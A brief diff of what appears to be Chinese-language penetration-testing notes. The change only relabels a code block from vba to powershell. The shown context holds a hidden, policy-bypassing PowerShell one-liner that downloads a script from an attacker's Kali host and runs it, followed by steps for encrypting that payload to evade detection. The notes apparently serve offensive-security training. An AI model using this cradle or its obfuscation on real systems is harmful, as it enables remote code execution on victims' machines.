@@ -2621,7 +2621,7 @@ End Sub
 在 PowerShell 中建立一個加密腳本:\
 建立 $payload 的輸入變量，包含要加密的字串；同時建立 $output 的變量，包含加密後的字串\
 透過 [ToCharArray](https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8) method 將整個字串轉換為字元數組，然後 使用「%」簡寫透過 [Foreach](https://ss64.com/ps/foreach-object.html) 循環來輸出
-```vba
+```powershell
 $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://{KALI_IP}/run.txt'))"
 
 [string]$output = ""
